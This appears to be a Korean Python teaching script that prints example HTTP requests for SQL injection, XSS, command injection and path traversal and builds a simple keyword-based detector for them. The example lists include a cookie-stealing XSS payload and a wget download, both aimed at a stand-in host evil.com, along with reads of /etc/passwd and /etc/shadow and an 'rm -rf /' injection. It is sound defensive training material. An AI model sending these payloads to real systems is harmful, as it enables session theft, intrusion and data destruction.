"""
실습 1: 웹 공격 예시 체험
========================
실제 웹 공격이 HTTP 요청에서 어떻게 보이는지 확인합니다.
악성 패턴을 눈으로 직접 확인하고, 정상 요청과 비교합니다.

실행: python attack_examples.py
"""

# ============================================================
# 1. 정상 vs 공격 HTTP 요청 비교
# ============================================================

print("=" * 65)
print("  [실습 1] 웹 공격 예시 체험 - 정상 vs 공격 요청 비교")
print("=" * 65)

# 정상 요청 예시
normal_requests = [
    'GET /index.html HTTP/1.1',
    'GET /products?id=42&category=shoes HTTP/1.1',
    'POST /login HTTP/1.1  body: user=john&pw=mypass123',
    'GET /api/users/5 HTTP/1.1',
    'GET /images/logo.png HTTP/1.1',
]

# SQL Injection 공격 예시
sql_injection_requests = [
    "GET /login?user=admin'-- HTTP/1.1",
    "GET /products?id=1 UNION SELECT username,password FROM users HTTP/1.1",
    "POST /search HTTP/1.1  body: q='; DROP TABLE users; --",
    "GET /login?user=admin&pw=' OR '1'='1 HTTP/1.1",
    "GET /api/users?id=1 OR 1=1 HTTP/1.1",
]

# XSS 공격 예시
xss_requests = [
    "GET /search?q=<script>alert('XSS')</script> HTTP/1.1",
    "POST /comment HTTP/1.1  body: msg=<img src=x onerror=alert(1)>",
    "GET /board?title=<iframe src='http://evil.com'></iframe> HTTP/1.1",
    "POST /profile HTTP/1.1  body: name=<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "GET /search?q=<svg onload=alert('hack')> HTTP/1.1",
]

# Command Injection 공격 예시
cmd_injection_requests = [
    "GET /download?file=report.pdf; cat /etc/passwd HTTP/1.1",
    "POST /ping HTTP/1.1  body: host=8.8.8.8 | ls -la /",
    "GET /lookup?domain=google.com && wget http://evil.com/malware HTTP/1.1",
    "POST /convert HTTP/1.1  body: input=test; rm -rf / HTTP/1.1",
    "GET /api/exec?cmd=whoami HTTP/1.1",
]

# Path Traversal 공격 예시
path_traversal_requests = [
    "GET /files/../../../etc/passwd HTTP/1.1",
    "GET /download?file=../../../etc/shadow HTTP/1.1",
    "GET /static/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1",
    "GET /files/....//....//etc/passwd HTTP/1.1",
    "GET /download?file=%00../../windows/system32/config/sam HTTP/1.1",
]


def print_requests(title, requests, attack_type=""):
    """요청 목록을 보기 좋게 출력"""
    print(f"\n{'─' * 65}")
    print(f"  {title}")
    print(f"{'─' * 65}")
    for i, req in enumerate(requests, 1):
        print(f"  {i}. {req}")
    if attack_type:
        print(f"\n  >> 탐지 포인트: {attack_type}")


print_requests(
    "정상 요청 (Benign)",
    normal_requests,
    "특별한 패턴 없음. 일반적인 페이지 접근, 로그인, API 호출"
)

print_requests(
    "SQL Injection 공격",
    sql_injection_requests,
    "' (작은따옴표), --, UNION SELECT, OR 1=1, DROP TABLE 등 SQL 키워드"
)

print_requests(
    "XSS (Cross-Site Scripting) 공격",
    xss_requests,
    "<script>, alert(, onerror=, <iframe>, <svg onload= 등 HTML/JS 태그"
)

print_requests(
    "Command Injection 공격",
    cmd_injection_requests,
    "; (세미콜론), | (파이프), &&, cat /etc, rm -rf, wget, whoami"
)

print_requests(
    "Path Traversal 공격",
    path_traversal_requests,
    "../ (상위 디렉토리), %2f (인코딩), /etc/passwd, %00 (널바이트)"
)


# ============================================================
# 2. 간단한 패턴 매칭 탐지기 만들기
# ============================================================
print(f"\n\n{'=' * 65}")
print("  [실습 2] 간단한 규칙 기반 공격 탐지기 만들기")
print(f"{'=' * 65}")

# 공격 탐지 규칙 (키워드 기반)
ATTACK_PATTERNS = {
    "SQL Injection": ["' or", "union select", "drop table", "--", "1=1", "' or '"],
    "XSS": ["<script>", "alert(", "onerror=", "<iframe", "<svg", "javascript:"],
    "Command Injection": ["; cat", "| ls", "&& wget", "rm -rf", "whoami", "; rm"],
    "Path Traversal": ["../", "..%2f", "/etc/passwd", "/etc/shadow", "%00"],
}


def detect_attack(request):
    """규칙 기반으로 공격 유형 탐지"""
    request_lower = request.lower()
    for attack_type, patterns in ATTACK_PATTERNS.items():
        for pattern in patterns:
            if pattern.lower() in request_lower:
                return attack_type, pattern
    return "Benign", ""


# 모든 요청을 탐지기에 통과시키기
all_requests = {
    "정상": normal_requests,
    "SQL Injection": sql_injection_requests,
    "XSS": xss_requests,
    "Command Injection": cmd_injection_requests,
    "Path Traversal": path_traversal_requests,
}

print("\n  [탐지 결과]")
print(f"  {'요청(앞 50자)':<52s} | {'탐지 결과':<18s} | 매칭 패턴")
print(f"  {'─' * 52}-+-{'─' * 18}-+-{'─' * 15}")

correct = 0
total = 0
for true_label, requests in all_requests.items():
    for req in requests:
        detected, pattern = detect_attack(req)
        total += 1

        # 정상이면 Benign, 아니면 공격 이름 비교
        is_correct = (true_label == "정상" and detected == "Benign") or \
                     (true_label != "정상" and detected != "Benign")
        correct += is_correct

        mark = "O" if is_correct else "X"
        display_req = req[:50] + ".." if len(req) > 50 else req
        print(f"  {display_req:<52s} | {detected:<18s} | {pattern}")

accuracy = correct / total * 100
print(f"\n  규칙 기반 탐지 정확도: {correct}/{total} = {accuracy:.1f}%")
print(f"  >> 규칙 기반 방법의 한계: 패턴이 조금만 변형되면 탐지 실패!")


# ============================================================
# 3. 공격 유형별 특징 요약
# ============================================================
print(f"\n\n{'=' * 65}")
print("  [정리] 공격 유형별 데이터 특성 요약")
print(f"{'=' * 65}")

summary = """
  공격 유형          | 주요 탐지 특성              | 데이터에서의 패턴
  ──────────────────┼────────────────────────────┼──────────────────────
  SQL Injection     | URL/파라미터의 SQL 키워드   | 요청 길이 보통, 응답 큼
  XSS               | HTML/JS 태그 삽입          | 요청 길이 보통
  DDoS              | 대량 요청, 짧은 간격        | 패킷 수 많음, 간격 짧음
  DoS (Slow)        | 긴 연결 유지, 느린 전송     | 지속시간 매우 김, 패킷 적음
  Brute Force       | 반복적 로그인 시도          | 동일 포트 반복, 패킷 일정
  Bot               | 자동화된 규칙적 패턴        | 간격 표준편차 낮음
  Command Injection | OS 명령어 키워드            | 요청 길이 보통
  Path Traversal    | ../ 경로 조작              | 요청에 상위 경로 포함

  >> 다음 시간(2교시)에서 실제 데이터로 이 패턴들을 확인합니다!
"""
print(summary)
